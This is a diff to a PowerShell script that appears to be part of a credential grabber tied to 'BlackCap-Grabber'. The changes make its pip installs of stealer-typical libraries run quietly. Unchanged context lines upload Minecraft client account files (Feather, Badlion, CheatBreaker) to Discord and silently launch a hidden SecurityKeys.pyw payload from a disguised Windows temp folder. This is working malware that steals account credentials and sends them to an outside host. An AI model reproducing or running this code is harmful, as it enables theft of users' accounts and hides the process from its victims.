@@ -42,23 +42,23 @@ powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -A
 
 #####################################################################
 python.exe -m pip install --upgrade pip
-if (-not (Get-Module -Name httpx)) { pip install httpx }
-if (-not (Get-Module -Name pyperclip)) { pip install pyperclip }
-if (-not (Get-Module -Name pyotp)) { pip install pyotp }
-if (-not (Get-Module -Name asyncio)) { pip install asyncio }
-if (-not (Get-Module -Name winregistry)) { pip install winregistry }
-if (-not (Get-Module -Name psutil)) { pip install psutil }
-if (-not (Get-Module -Name pypiwin32)) { pip install pypiwin32==223 }
-if (-not (Get-Module -Name pycryptodome)) { pip install pycryptodome }
-if (-not (Get-Module -Name pyinstaller)) { pip install pyinstaller>=5.0 }
-if (-not (Get-Module -Name PIL)) { pip install Pillow; pip install PIL-tools }
-if (-not (Get-Module -Name threaded)) { pip install threaded }
-if (-not (Get-Module -Name requests)) { pip install requests }
-if (-not (Get-Module -Name colorama)) { pip install colorama }
-if (-not (Get-Module -Name pillow)) { pip install pillow }
-if (-not (Get-Module -Name customtkinter)) { pip install customtkinter }
-if (-not (Get-Module -Name pyfiglet)) { pip install pyfiglet }
-if (-not (Get-Module -Name tqdm)) { pip install tqdm }
+pip install httpx --quiet
+pip install pyperclip --quiet 
+pip install pyotp --quiet
+pip install asyncio --quiet
+pip install winregistry --quiet
+pip install psutil --quiet
+pip install pypiwin32==223 --quiet
+pip install pycryptodome --quiet
+pip install pyinstaller>=5.0 --quiet
+pip install Pillow; pip install PIL-tools --quiet
+pip install threaded --quiet
+pip install requests --quiet
+pip install colorama --quiet
+pip install pillow --quiet
+pip install customtkinter --quiet
+pip install pyfiglet --quiet
+pip install tqdm --quiet
 #https://github.com/KSCHdsc/BlackCap-Grabber
 #####################################################################
 
@@ -157,7 +157,6 @@ Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\.minecraft\cheatbre
 Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\.feather\accounts.json"
 Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\Badlion Client\accounts.dat"
 Start-Process -FilePath "C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.pyw"
-#Pythonw.exe is like python.exe but with no windows (like silent start)
 ######################################################################
 
 
